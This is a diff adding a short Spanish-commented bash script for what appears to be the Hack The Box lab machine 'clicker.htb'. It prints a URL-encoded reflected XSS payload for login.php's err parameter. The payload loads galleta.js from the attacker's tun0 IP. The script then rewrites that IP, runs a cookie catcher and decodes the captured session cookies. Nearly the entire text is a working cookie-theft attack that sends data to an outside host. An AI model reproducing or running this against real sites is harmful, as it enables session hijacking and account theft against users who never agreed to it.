@@ -1,0 +1,48 @@
+#!/bin/bash
+
+
+echo ""
+echo "ejecutar en el navegador despues de login.php:"
+echo "?err=%3Cscript%20src=%22http://10.10.14.3/galleta.js%22%3E%3C/script%3E"
+echo ""
+echo "por ejemplo http://clicker.htb/login.php?err=%3Cscript%20src=%22http://10.10.14.3/galleta.js%22%3E%3C/script%3E"
+
+echo ""
+echo ""
+
+
+
+
+# Copiar galleta.js desde /usr/bin al directorio actual
+cp /usr/bin/galleta.js .
+
+# Obtener la dirección IP de la interfaz tun0 y eliminar el /23
+ip_tun0=$(ip addr show tun0 | grep -oP 'inet \K\S+' | cut -d'/' -f1)
+
+# Mostrar la dirección IP de la interfaz tun0 y preguntar al usuario si desea utilizarla
+read -p "Tu IP de tun0 es: $ip_tun0. ¿Deseas utilizar esta IP? (Presiona Enter para continuar, 'n' para cambiar): " respuesta
+
+# Si el usuario elige no, pedir una nueva dirección IP
+if [[ "$respuesta" == "n" ]]; then
+    read -p "Ingresa la IP que deseas utilizar: " nueva_ip
+else
+    nueva_ip=$ip_tun0
+fi
+
+# Si nueva_ip está vacía, usar la IP de tun0
+if [[ -z "$nueva_ip" ]]; then
+    nueva_ip=$ip_tun0
+fi
+
+# Reemplazar la dirección IP en galleta.js con la nueva IP
+sed -i "s/http:\/\/10\.10\.14\.3/http:\/\/$nueva_ip/g" galleta.js
+
+# Ejecutar el comando galleta
+galletapython
+
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+echo "Tu cookie es:"
+echo ""
+
+cat cookies.txt | base64 -d; echo
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
